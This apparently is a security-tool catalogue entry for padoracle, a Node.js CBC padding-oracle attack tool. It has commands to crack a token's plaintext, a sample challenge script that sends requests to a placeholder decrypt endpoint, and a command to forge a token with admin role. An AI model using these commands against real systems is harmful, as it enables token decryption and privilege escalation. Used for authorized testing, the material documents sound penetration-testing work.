---
name: "padoracle"
categories:
  - blackarch-crypto
version: "0.1.1.r30.g535ae89"
homepage: "https://github.com/imyelo/padoracle"
packaged-by: [blackarch]
blackarch-builddate: "2026-09-19"
build-system: node
license: Apache-2.0
meta-checked: "2026-11-09"
github-repo: "imyelo/padoracle"
github-stars: 10
github-pushed: "2026-05-28"
github-archived: false
github-issues: 2
github-match: "exact"
gh-checked: "2026-11-07"
worth: 4.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 4
gh-activity-checked: "2026-11-09"
---

# padoracle

> Node.js padding oracle attack tool: cracks plaintext from a known IV+ciphertext pair, or forges a new pair for modified plaintext, driven by a user-written challenge script.

## What it's for

padoracle exploits CBC padding oracles from JavaScript. Its model differs from classic tools such as padbuster: instead of a URL and request template, you write a small ESM challenge script — an exported function taking `(iv, cipher)` buffers that performs the decryption request against the target and returns `false` when padding fails, `true` otherwise — and pass it on the command line together with a Base64-encoded IV+ciphertext pair. Cracking runs with unlimited concurrency by default. It is one of a family of padding-oracle implementations (padbuster, padre, pax-oracle, poracle) but the only one scripted in JavaScript, which suits targets whose oracle is easiest to express as a Node request. It needs Node.js, and the challenge script's own dependencies (e.g. an HTTP client) must be installed separately.

## Typical use cases

### Crack the plaintext of a known token

```
padoracle challenge.js --iv-cipher UGFkT3JhY2xlOml2L2NiYyiFmLTj7lhu4mAJHakEqcIIoYU0lIUXKx+PmTaUHLV0 --size 16
```

Outcome: drives the challenge script with candidate blocks until the token's plaintext is recovered and printed to the terminal; `--size 16` matches AES blocks (use 8 for DES-family ciphers), and the `--iv-cipher` value is the Base64 of IV and ciphertext concatenated.

### Write the challenge script that couples it to a target

```javascript
const got = require('got')

const challenge = async (iv, cipher) => {
  const response = await got.post('https://target.example.com/api/decrypt', {
    body: Buffer.concat([iv, cipher]).toString('base64'),
  }).catch((error) => error.response)
  return response.body !== 'DECRYPTION FAILED'
}

export default challenge
```

Outcome: this file is the tool's only coupling to the application — edit the URL, request shape, and failure indicator to match how the target reveals bad padding, then run `padoracle challenge.js ...` against it.

### Forge a token with modified plaintext

```
padoracle challenge.js --size 16 --plain '{"user":"admin","role":"admin"}'
```

Outcome: emits a new Base64 IV+ciphertext pair that the oracle decrypts to the supplied plaintext — replace the original token with it to test the application's authorization logic.

### Throttle request concurrency

```
padoracle challenge.js --iv-cipher UGFkT3JhY2xlOml2L2NiYyiFmLTj7lhu4mAJHakEqcIIoYU0lIUXKx+PmTaUHLV0 --size 16 --concurrency 8
```

Outcome: caps the number of in-flight decryption challenges (default: unlimited), trading crack speed for a lower request rate against rate-limited or fragile targets.

*No corpus evidence — derived from upstream documentation.*
